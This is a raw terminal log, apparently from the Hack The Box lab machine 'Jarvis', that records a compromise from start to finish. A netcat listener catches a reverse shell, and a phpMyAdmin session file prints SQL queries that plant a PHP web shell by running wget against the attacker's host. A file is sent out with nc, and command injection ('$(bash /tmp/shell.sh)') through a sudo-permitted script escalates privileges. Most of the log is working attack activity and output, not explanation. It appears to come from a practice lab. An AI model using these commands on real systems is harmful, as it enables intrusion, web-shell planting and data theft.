┌─[root@parrot]─[~/hackthebox/jarvis]    
└──╼ #nc -nvlp 9001                      
Ncat: Version 7.80 ( https://nmap.org/ncat )                                      
Ncat: Listening on :::9001               
Ncat: Listening on 0.0.0.0:9001          
Ncat: Connection from 10.10.10.143.      
Ncat: Connection from 10.10.10.143:48582.                                         
Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux                                                                                  
 08:04:54 up 21:36,  0 users,  load average: 0.03, 0.05, 0.02                     
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT               
uid=33(www-data) gid=33(www-data) groups=33(www-data)                             
/bin/sh: 0: can't access tty; job control turned off                              
$ python -c "import pty;  pty.spawn('/bin/bash')"                                 
www-data@jarvis:/$ ^Z                    
[1]+  Stopped                 nc -nvlp 9001                                       
┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
└──╼ #stty raw -echo                     
┌─[root@parrot]─[~/hackthebox/jarvis]    
└──╼ #nc -nvlp 9001                      

www-data@jarvis:/$ ls                    
bin   home            lib32       mnt   run   tmp      vmlinuz.old                
boot  initrd.img      lib64       opt   sbin  usr                                 
dev   initrd.img.old  lost+found  proc  srv   var                                 
etc   lib             media       root  sys   vmlinuz                             
www-data@jarvis:/$ cd /var/lib/php       
www-data@jarvis:/var/lib/php$ ls         
modules  sessions                        
www-data@jarvis:/var/lib/php$ cd sessions
www-data@jarvis:/var/lib/php/sessions$ cat sss_b1t2ttbinrsj70tj57timo740r4h4ogh   
cat: sss_b1t2ttbinrsj70tj57timo740r4h4ogh: No such file or directory              
</sessions$ cat sss_b1t2ttbinrsj70tj57timo740r4h4ogh                              
cat: sss_b1t2ttbinrsj70tj57timo740r4h4ogh: No such file or directory              
<sessions$ cat sess_b1t2ttbinrsj70tj57timo740r4h4ogh                              
 PMA_token |s:16:"TobZBW:mIQT9rF_}";browser_access_time|a:1:{s:7:"default";i:1578488611;}relation|a:1:{i:1;a:22:{s:11:"PMA_VERSION";s:5:"4.8.0";s:7:"relwork";b:0;s:11:"displaywork";b:0;s:12:"bookmarkwork";b:0;s:7:"pdfwork";b:0;s:8:"commwork";b:0;s:8:"mimework";b:0;s:11:"historywork";b:0;s:10:"recentwork";b:0;s:12:"favoritework";b:0;s:11:"uiprefswork";b:0;s:12:"trackingwork";b:0;s:14:"userconfigwork";b:0;s:9:"menuswork";b:0;s:7:"navwork";b:0;s:17:"savedsearcheswork";b:0;s:18:"centralcolumnswork";b:0;s:20:"designersettingswork";b:0;s:19:"exporttemplateswork";b:0;s:8:"allworks";b:0;s:4:"user";N;s:2:"db";N;}}cache|a:2:{s:16:"server_1_DBadmin";a:16:{s:14:"mysql_cur_user";s:17:"DBadmin@localhost";s:17:"is_create_db_priv";b:1;s:14:"is_reload_priv";b:1;s:12:"db_to_create";s:0:"";s:30:"dbs_where_create_table_allowed";a:1:{i:0;s:1:"*";}s:11:"dbs_to_test";b:0;s:9:"proc_priv";b:1;s:10:"table_priv";b:1;s:8:"col_priv";b:1;s:7:"db_priv";b:1;s:12:"is_grantuser";b:0;s:13:"is_createuser";b:1;s:12:"is_superuser";b:1;s:11:"binary_logs";a:0:{}s:18:"menu-levels-server";a:13:{s:9:"databases";s:9:"Databases";s:3:"sql";s:3:"SQL";s:6:"status";s:6:"Status";s:6:"rights";s:5:"Users";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:8:"settings";s:8:"Settings";s:6:"binlog";s:10:"Binary log";s:11:"replication";s:11:"Replication";s:4:"vars";s:9:"Variables";s:7:"charset";s:8:"Charsets";s:7:"plugins";s:7:"Plugins";s:6:"engine";s:7:"Engines";}s:19:"profiling_supported";b:1;}s:8:"server_1";a:3:{s:15:"userprefs_mtime";i:1578488421;s:14:"userprefs_type";s:7:"session";s:12:"config_mtime";i:1523112944;}}encryption_key|s:32:"aqXMy0>#5A\̘5F";userconfig|a:2:{s:2:"db";a:1:{s:12:"Console/Mode";s:8:"collapse";}s:2:"ts";i:1578488611;}two_factor_check|b:1;is_git_revision|b:0;tmpval|a:12:{s:15:"favorite_tables";a:1:{i:1;a:0:{}}s:13:"recent_tables";a:1:{i:1;a:0:{}}s:5:"query";a:2:{s:32:"3ac4d1ce06ed0f31ae7cc4ad797915b8";a:8:{s:3:"sql";s:88:"SELECT '<?php exec("wget -O /var/www/html/shell.php http://10.10.14.14:8000/t.php"); ?>'";s:12:"repeat_cells";i:100;s:8:"max_rows";i:25;s:3:"pos";s:1:"0";s:6:"pftext";s:1:"P";s:18:"relational_display";s:1:"K";s:9:"geoOption";s:4:"GEOM";s:14:"display_binary";b:1;}s:32:"865e2167e21701401186476a6285bf9e";a:8:{s:3:"sql";s:88:"SELECT '<?php exec("wget -O /var/www/html/arrow.php http://10.10.14.14:8000/t.php"); ?>'";s:12:"repeat_cells";i:100;s:8:"max_rows";i:25;s:3:"pos";s:1:"0";s:6:"pftext";s:1:"P";s:18:"relational_display";s:1:"K";s:9:"geoOption";s:4:"GEOM";s:14:"display_binary";b:1;}}s:6:"pftext";s:1:"P";s:18:"relational_display";s:1:"K";s:9:"geoOption";s:4:"GEOM";s:14:"display_binary";b:1;s:12:"display_blob";b:0;s:19:"hide_transformation";b:0;s:3:"pos";s:1:"0";s:8:"max_rows";i:25;s:12:"repeat_cells";i:100;}ConfigFile1|a:2:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}s:7:"Servers";a:1:{i:1;a:2:{s:7:"only_db";s:0:"";s:7:"hide_db";s:0:"";}}}debug|a:0:{}Import_message|a:2:{s:7:"message";N;s:11:"go_back_url";s:14:"server_sql.php";}is_multi_query|b:0;sql_from_query_box|b:1;sql_history|a:2:{i:0;a:3:{s:2:"db";s:0:"";s:5:"table";s:0:"";s:8:"sqlquery";s:88:"SELECT '<?php exec("wget -O /var/www/html/shell.php http://10.10.14.14:8000/t.php"); ?>'";}i:1;a:3:{s:2:"db";s:0:"";s:5:"table";s:0:"";s:8:"sqlquery";s:88:"SELECT '<?php exec("wget -O /var/www/html/arrow.php http://10.10.14.14:8000/t.php"); ?>'";}}errors|a:0:{}www-data@jarvis:/var/lib/php/sessions$                                                   
www-data@jarvis:/var/lib/php/sessions$ export TERM=screen-256color                
www-data@jarvis:/var/lib/php/sessions$ clear                                      
www-data@jarvis:/var/lib/php/sessions$ sudo -l                                    
Matching Defaults entries for www-data on jarvis:                                 
    env_reset, mail_badpass,             
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 

User www-data may run the following commands on jarvis:                           
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py                  
yww-data@jarvis:/var/lib/php/sessions$ ls -la /var/www/Admin-Utilities/simpler.py 
-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 /var/www/Admin-Utilities/simpler.py  
nc 10.10.14.14 9002r/lib/php/sessions$ cat /var/www/Admin-Utilities/simpler.py |  
^C                                       
www-data@jarvis:/var/lib/php/sessions$ vi /tmp/shell.sh                           
www-data@jarvis:/var/lib/php/sessions$ vi /tmp/shell.sh                           
www-data@jarvis:/var/lib/php/sessions$ vi /tmp/shell.sh                           
www-data@jarvis:/var/lib/php/sessions$ chmod +x /tmp/shell.sh                     
www-data@jarvis:/var/lib/php/sessions$ bash /tmp/shell.sh                         
pler.py -parvis:/var/lib/php/sessions$ sudo -u#1000 /var/www/Admin-Utilities/simp 
***********************************************                                   
     _                 _                                                          
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _                                    
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |                                   
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |                                   
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |                                   
                |_|               |_|    |___/                                    
                                @ironhackers.es                                   
                                         
***********************************************                                   

Enter an IP: $(bash /tmp/shell.sh)       
